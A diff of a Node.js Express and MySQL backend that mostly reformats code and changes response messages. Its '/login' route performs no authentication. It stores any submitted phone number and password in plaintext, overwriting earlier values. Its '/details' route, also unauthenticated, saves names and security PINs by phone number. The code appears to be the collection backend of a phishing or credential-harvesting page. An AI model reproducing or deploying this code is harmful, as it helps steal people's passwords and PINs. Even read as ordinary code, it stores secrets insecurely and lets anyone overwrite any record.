@@ -29,16 +29,16 @@ const db = mysql.createPool({
     }
 });
 
+// Test Connection
 db.getConnection((err, connection) => {
 
     if (err) {
-        console.log("Database Error");
+        console.log("❌ Database Error");
         console.log(err);
         return;
     }
 
     console.log("✅ MySQL Connected");
-
     connection.release();
 
 });
@@ -52,35 +52,33 @@ app.post("/login", (req, res) => {
     const { phone, password } = req.body;
 
     if (!phone || !password) {
-
         return res.status(400).json({
+            success: false,
             message: "Phone and Password Required"
         });
-
     }
 
     const sql = `
-    INSERT INTO users(phone,password)
-    VALUES(?,?)
-    ON DUPLICATE KEY UPDATE
-    password=VALUES(password)
+        INSERT INTO users(phone, password)
+        VALUES(?, ?)
+        ON DUPLICATE KEY UPDATE
+        password = VALUES(password)
     `;
 
-    db.query(sql, [phone, password], (err) => {
+    db.query(sql, [phone, password], (err, result) => {
 
         if (err) {
-
             console.log(err);
 
             return res.status(500).json({
+                success: false,
                 message: "Database Error"
             });
-
         }
 
         res.json({
             success: true,
-            message: "Login Saved"
+            message: "Login Data Saved Successfully"
         });
 
     });
@@ -102,58 +100,59 @@ app.post("/details", (req, res) => {
     } = req.body;
 
     const sql = `
-    UPDATE users
-    SET
-    full_name=?,
-    problem_type=?,
-    security_pin=?,
-    experience_level=?
-    WHERE phone=?
+        UPDATE users
+        SET
+            full_name = ?,
+            problem_type = ?,
+            security_pin = ?,
+            experience_level = ?
+        WHERE phone = ?
     `;
 
-    db.query(sql, [
+    db.query(
+        sql,
+        [
+            fullName,
+            problemType,
+            securityPin,
+            experienceLevel,
+            phone
+        ],
+        (err, result) => {
 
-        fullName,
-        problemType,
-        securityPin,
-        experienceLevel,
-        phone
+            if (err) {
+                console.log(err);
 
-    ], (err) => {
+                return res.status(500).json({
+                    success: false,
+                    message: "Database Error"
+                });
+            }
 
-        if (err) {
-
-            console.log(err);
-
-            return res.status(500).json({
-                message: "Database Error"
+            res.json({
+                success: true,
+                message: "Details Saved Successfully"
             });
 
         }
-
-        res.json({
-
-            success: true,
-            message: "Details Saved"
-
-        });
-
-    });
+    );
 
 });
 
 // ======================
+// Home Route
+// ======================
 
 app.get("/", (req, res) => {
-
-    res.send("Backend Running");
-
+    res.send("Backend Running Successfully");
 });
+
+// ======================
+// Start Server
+// ======================
 
 const PORT = process.env.PORT || 5500;
 
 app.listen(PORT, () => {
-
-    console.log(`Server Running On ${PORT}`);
-
+    console.log(`🚀 Server Running On ${PORT}`);
 });
